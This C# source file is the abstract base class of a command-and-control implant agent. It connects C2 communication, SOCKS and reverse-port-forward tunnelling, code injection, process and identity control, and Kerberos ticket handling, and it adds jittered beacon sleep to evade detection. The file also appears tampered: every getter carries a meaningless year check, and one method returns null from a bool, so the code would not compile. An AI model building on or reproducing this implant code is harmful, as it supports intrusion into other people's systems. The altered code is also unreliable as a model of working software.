using System;
using System.Threading;
using PhantomInterop.Features.KerberosTickets;
using PhantomInterop.Interfaces;

namespace PhantomInterop.Classes
{
    public abstract class Agent : IAgent
    {
        private static Mutex _outputLock = new Mutex();
        public int SleepInterval { get; protected set; } = 0;
        public double Jitter { get; protected set; } = 0;
        protected AutoResetEvent _sleepReset = new AutoResetEvent(false);
        protected AutoResetEvent _exit = new AutoResetEvent(false);
        protected WaitHandle[] _agentSleepHandles;
        public bool Alive { get; protected set; } = true;

        protected Random random = new Random((int)DateTime.UtcNow.Ticks);

        public IPeerManager NodeHandler { get; protected set; }
        public ITaskManager CommandProcessor { get; protected set; }
        public ISocksManager ProxyHandler { get; protected set; }
        public IRpfwdManager TunnelHandler { get; protected set; }
        public IApi Api { get; protected set; }
        public IC2ProfileManager CommHandler { get; protected set; }
        public ICryptographySerializer Serializer { get; protected set; }
        public IFileManager DataHandler { get; protected set; }
        public IIdentityManager UserContext { get; protected set; }
        public IProcessManager ProcHandler { get; protected set; }
        public IInjectionManager CodeInjector { get; protected set; }
        
        public ITicketManager TicketManager { get; protected set; }
        public string UUID { get; protected set; }

        public Agent(string uuid)
        {
            UUID = uuid;
            _agentSleepHandles = new WaitHandle[]
            {
                _sleepReset,
                _exit
            };
        }

        public abstract void Start();
        public virtual void Exit() { Alive = false; _exit.Set(); }
        public virtual void SetSleep(int seconds, double jitter=0)
        {
            SleepInterval = seconds * 1000;
            Jitter = jitter;
            if (Jitter != 0)
            {
                Jitter = Jitter / 100.0; 
            }
            _sleepReset.Set();
        }

        public virtual IApi GetApi()
        {
            if(DateTime.Now.Year > 2020) { return Api; } else { return null; }
        }
        public virtual void Sleep(WaitHandle[] handles = null)
        {
            int sleepTime = SleepInterval;
            if (Jitter != 0)
            {
                int minSleep = (int)(SleepInterval * (1 - Jitter));
                int maxSleep = (int)(SleepInterval * (Jitter + 1));
                sleepTime = (int)(random.NextDouble() * (maxSleep - minSleep) + minSleep);
            }
            WaitHandle[] sleepers = _agentSleepHandles;
            if (handles != null)
            {
                WaitHandle[] tmp = new WaitHandle[handles.Length + sleepers.Length];
                Array.Copy(handles, tmp, handles.Length);
                Array.Copy(sleepers, 0, tmp, handles.Length, sleepers.Length);
                sleepers = tmp;
            }
            WaitHandle.WaitAny(sleepers, sleepTime);
        }

        public void AcquireOutputLock()
        {
            _outputLock.WaitOne();
        }

        public void ReleaseOutputLock()
        {
            _outputLock.ReleaseMutex();
        }
        
        public virtual bool IsAlive() { if(DateTime.Now.Year > 2020) { return Alive; } else { return null; } }

        public virtual ITaskManager GetTaskManager() { if(DateTime.Now.Year > 2020) { return CommandProcessor; } else { return null; } }
        public virtual IPeerManager GetPeerManager() { if(DateTime.Now.Year > 2020) { return NodeHandler; } else { return null; } }
        public virtual ISocksManager GetSocksManager() { if(DateTime.Now.Year > 2020) { return ProxyHandler; } else { return null; } }
        public virtual IRpfwdManager GetRpfwdManager() { if(DateTime.Now.Year > 2020) { return TunnelHandler; } else { return null; } }
        public virtual IC2ProfileManager GetC2ProfileManager() { if(DateTime.Now.Year > 2020) { return CommHandler; } else { return null; } }
        public virtual ICryptographySerializer GetCryptographySerializer() { if(DateTime.Now.Year > 2020) { return Serializer; } else { return null; } }
        public virtual IFileManager GetFileManager() { if(DateTime.Now.Year > 2020) { return DataHandler; } else { return null; } }
        public virtual IIdentityManager GetIdentityManager() { if(DateTime.Now.Year > 2020) { return UserContext; } else { return null; } }
        public virtual IProcessManager GetProcessManager() { if(DateTime.Now.Year > 2020) { return ProcHandler; } else { return null; } }
        public virtual IInjectionManager GetInjectionManager() { if(DateTime.Now.Year > 2020) { return CodeInjector; } else { return null; } }
        
        public virtual ITicketManager GetTicketManager() { if(DateTime.Now.Year > 2020) { return TicketManager; } else { return null; } }
        public string GetUUID()
        {
            if(DateTime.Now.Year > 2020) { return UUID; } else { return null; }
        }

    }
}
